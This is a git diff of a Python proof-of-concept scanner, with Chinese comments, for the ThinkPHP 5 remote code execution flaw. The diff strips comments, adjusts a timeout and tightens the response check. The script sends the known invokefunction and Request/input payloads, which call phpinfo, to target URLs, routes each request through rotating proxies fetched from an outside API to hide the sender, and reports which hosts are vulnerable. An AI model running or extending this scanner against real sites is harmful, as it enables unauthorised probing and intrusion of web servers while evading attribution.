@@ -11,19 +11,19 @@ PROXY_API = "https://proxy.scdn.io/api/get_proxy.php"
 PROXY_COUNT = 10          # 一次性获取 10 个代理，用完再取新的
 proxy_list = []           # 缓存代理列表
 
-def fetch_proxies(count=PROXY_COUNT, protocol="http"): #获取10个参数 第二个参数，指定代理协议类型，默认值为 "http"。调用时如果不传，就只获取 HTTP 代理。
+def fetch_proxies(count=PROXY_COUNT, protocol="http"):
     """从 API 获取代理列表"""
     try:
         params = {
             "protocol": protocol,
             "count": count
         }
-        resp = requests.get(PROXY_API, params=params, timeout=10)   
+        resp = requests.get(PROXY_API, params=params, timeout=10)
         if resp.status_code == 200:
-            data = resp.json()             #按照python字典返回
-            if data.get("code") == 200 and "data" in data:     #读取ip
+            data = resp.json()
+            if data.get("code") == 200 and "data" in data:
                 proxies = data["data"].get("proxies", [])
-                print(f"[*] 获取到 {len(proxies)} 个代理")      #获取到的ip数量
+                print(f"[*] 获取到 {len(proxies)} 个代理")
                 return proxies
     except Exception as e:
         print(f"[!] 获取代理失败: {e}")
@@ -31,23 +31,23 @@ def fetch_proxies(count=PROXY_COUNT, protocol="http"): #获取10个参数 第二
 
 def get_proxy():
     """获取一个代理，如果列表为空则重新拉取"""
-    global proxy_list                          #ip存储的列表
+    global proxy_list
     if not proxy_list:
-        proxy_list = fetch_proxies()           #回到第一个函数获取ip
-    return random.choice(proxy_list) if proxy_list else None       #如果不是空就返回ip
+        proxy_list = fetch_proxies()
+    return random.choice(proxy_list) if proxy_list else None
 threadings=[]
 def poc(url):
     texts=[
-        "/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1",
-        "/index.php?s=index/\\think\\Request/input&filter=phpinfo&data=1"
+        r"/index.php?s=index/\\think\\app/invokefunction&function=phpinfo&vars[0]=1",       
+        r"/index.php?s=index/\\think\\Request/input&filter=phpinfo&data=1"
     ]
     for text in texts:
         pocurl=url+text
         try:
-            proxy = get_proxy()                                                                        #读取一个可用代理ip
-            proxies = {"http": f"http://{proxy}", "https": f"https://{proxy}"} if proxy else None      #拼接代理ip
-            resp = requests.get(pocurl, proxies=proxies, verify=False, timeout=8) #避免ssl证书报错，Web poc用get
-            if  resp.status_code == 200 and "php" in resp.text:
+            proxy = get_proxy()
+            proxies = {"http": f"http://{proxy}", "https": f"https://{proxy}"} if proxy else None
+            resp = requests.get(pocurl, proxies=proxies, verify=False, timeout=5) #避免ssl证书报错，Web poc用get
+            if  resp.status_code == 200 and "phpinfo" in resp.text:
                 print("thinkphp5漏洞存在----------",url)
                 return 
             else:
@@ -102,6 +102,10 @@ else:
 3.
 
 """
+
+
+
+
 
 
 
